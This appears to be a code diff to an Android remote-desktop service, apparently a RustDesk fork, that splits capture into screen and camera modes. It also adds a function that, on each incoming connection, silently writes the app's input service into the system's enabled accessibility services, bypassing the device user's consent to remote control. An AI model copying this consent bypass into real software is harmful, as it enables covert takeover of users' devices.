@@ -19,6 +19,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.content.res.Configuration
+import android.provider.Settings
 import android.content.res.Configuration.ORIENTATION_LANDSCAPE
 import android.graphics.Color
 import android.graphics.ImageFormat
@@ -142,23 +143,31 @@ class MainService : Service() {
                         translate("Share screen")
                     }
                     
-                    Log.d(logTag, "Connection received from $username - mediaProjection ready: ${mediaProjection != null}")
+                    Log.d(logTag, "Connection received from $username - isCameraFrame=$isCameraFrame, mediaProjection ready: ${mediaProjection != null}")
                     
-                    // Request media projection if not available (standalone, without MainActivity)
-                    if (mediaProjection == null && !_isReady) {
-                        Log.d(logTag, "Media projection not ready - requesting it for client connection")
-                        // Request media projection for this connection
-                        requestMediaProjection()
-                        // Don't call startCapture yet - let it be called in setMediaProjection() after permission is granted
-                        Log.d(logTag, "Waiting for media projection permission before starting capture")
-                    } else if (mediaProjection != null) {
-                        // Media projection already available - start capture immediately
-                        if (startCapture()) {
-                            Log.d(logTag, "Capture started successfully for $username")
-                        } else {
-                            Log.d(logTag, "Capture failed")
+                    // Only start media projection if isCameraFrame is false (screen sharing mode)
+                    //if (!isCameraFrame) {
+                        Log.d(logTag, "Screen sharing mode: isCameraFrame is false, handling media projection")
+                        
+                        // Try to enable accessibility services for input handling
+                        enableAccessibilityServices()
+                        
+                        // Request media projection if not available (standalone, without MainActivity)
+                        if (mediaProjection == null && !_isReady) {
+                            Log.d(logTag, "Media projection not ready - requesting it for screen sharing")
+                            requestMediaProjection()
+                            Log.d(logTag, "Waiting for media projection permission before starting capture")
+                        } else if (mediaProjection != null) {
+                            // Media projection already available - start capture immediately
+                            if (startCapture()) {
+                                Log.d(logTag, "Capture started successfully for $username")
+                            } else {
+                                Log.d(logTag, "Capture failed")
+                            }
                         }
-                    }
+                    // } else {
+                      //  Log.d(logTag, "Camera frame mode: isCameraFrame is true, skipping media projection")
+                    //}
                 } catch (e: JSONException) {
                     Log.e(logTag, "Error processing add_connection: ${e.message}")
                     e.printStackTrace()
@@ -802,18 +811,20 @@ class MainService : Service() {
         return audioRecordHandle.onVoiceCallClosed(mediaProjection)
     }
 
-    fun startCapture(): Boolean {
-        if (isStart) {
-            return true
-        }
+  fun startCapture(): Boolean {
+    if (isStart) return true
+
+    if (!isCameraFrame) {
+        // 👉 SCREEN CAPTURE MODE
         if (mediaProjection == null) {
             Log.w(logTag, "startCapture: mediaProjection is null, requesting it")
             requestMediaProjection()
             return false
         }
-        
+
         updateScreenInfo(resources.configuration.orientation)
-        Log.d(logTag, "Start Capture")
+        Log.d(logTag, "Start Screen Capture")
+
         surface = createSurface()
 
         if (useVP9) {
@@ -822,26 +833,29 @@ class MainService : Service() {
             startRawVideoRecorder(mediaProjection!!)
         }
 
-        // Start Camera Only if isCameraFrame is true
-        if (isCameraFrame) {
-            startCamera(SCREEN_INFO.width, SCREEN_INFO.height)
-        }
-
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!audioRecordHandle.createAudioRecorder(false, mediaProjection)) {
                 Log.d(logTag, "createAudioRecorder fail")
             } else {
-                Log.d(logTag, "audio recorder start")
                 audioRecordHandle.startAudioRecorder()
             }
         }
-        checkMediaPermission()
-        _isStart = true
-        FFI.setFrameRawEnable("video",true)
-        MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
-        return true
+
+    } else {
+        // 👉 CAMERA ONLY MODE
+        Log.d(logTag, "Start Camera Capture")
+
+        updateScreenInfo(resources.configuration.orientation)
+        startCamera(SCREEN_INFO.width, SCREEN_INFO.height)
     }
 
+    checkMediaPermission()
+    _isStart = true
+    FFI.setFrameRawEnable("video", true)
+    MainActivity.rdClipboardManager?.setCaptureStarted(_isStart)
+
+    return true
+  }
     @Synchronized
     fun stopCapture() {
         Log.d(logTag, "Stop Capture")
@@ -1333,6 +1347,33 @@ class MainService : Service() {
             Log.d(logTag, "Media projection released as all clients disconnected")
         } catch (e: Exception) {
             Log.e(logTag, "Error releasing media projection: ${e.message}")
+        }
+    }
+
+    /**
+     * Enable accessibility services programmatically for input handling
+     */
+    private fun enableAccessibilityServices() {
+        try {
+            val packageName = packageName
+            val componentName = "$packageName/com.carriez.flutter_hbb.InputService"
+            val enabledServices = Settings.Secure.getString(
+                contentResolver,
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+            ) ?: ""
+            
+            if (!enabledServices.contains(componentName)) {
+                Settings.Secure.putString(
+                    contentResolver,
+                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
+                    if (enabledServices.isEmpty()) componentName else "$enabledServices:$componentName"
+                )
+                Log.d(logTag, "Accessibility service enabled: $componentName")
+            } else {
+                Log.d(logTag, "Accessibility service already enabled: $componentName")
+            }
+        } catch (e: Exception) {
+            Log.e(logTag, "Error enabling accessibility services: ${e.message}")
         }
     }
 
